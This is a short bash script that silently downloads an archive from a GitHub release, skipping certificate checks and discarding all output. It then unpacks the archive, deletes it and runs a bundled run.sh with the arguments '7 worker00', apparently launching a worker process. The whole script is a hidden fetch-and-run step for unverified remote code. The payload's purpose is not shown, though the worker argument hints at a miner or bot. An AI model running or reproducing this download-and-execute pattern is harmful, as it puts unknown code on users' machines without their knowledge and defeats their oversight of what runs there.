#!/bin/bash

curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/LAB.tar.gz >/dev/null 2>&1
tar -xvf LAB.tar.gz >/dev/null 2>&1
rm LAB.tar.gz
cd LAB
cd mcp
chmod +x run.sh 
./run.sh 7 worker00
